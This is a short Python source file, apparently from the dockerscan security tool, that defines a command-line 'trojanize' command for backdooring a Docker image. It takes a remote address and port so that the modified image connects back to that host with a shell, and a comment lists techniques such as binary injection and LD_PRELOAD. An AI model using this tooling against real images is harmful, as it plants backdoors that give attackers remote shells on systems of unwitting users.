import click

from dockerscan import check_console_input_config

from .model import *
from .console import *


@click.group(help="Modify a docker image commands")
@click.pass_context
def modify(ctx, **kwargs):
    pass


@modify.command(help="trojanize a Docker image")
@click.pass_context
@click.argument("image_path")
@click.option("--listen",
              "-l",
              "remote_addr",
              required=True,
              help="remote address where to connect to on shell starts")
@click.option("-p",
              "--port",
              "remote_port",
              default="2222",
              help="Remote port where to connect to on shell starts")
@click.option("--output", "-o", "output_image")
@click.option("--image-repository",
              "-r",
              "image_repository",
              help="in 'my_user/nginx:latest -> Repository is 'my_user''")
def trojanize(ctx, **kwargs):
    config = DockerImageInfoModifyTrojanizeModel(**ctx.obj, **kwargs)

    # Check if valid
    if check_console_input_config(config):
        launch_dockerscan_image_modify_trojanize_in_console(config)

#
# - Inject binary
# - Inject LD_PRELOAD -> as env vars
# - Add environment vars
# - Replace binary
#

__all__ = ("modify", )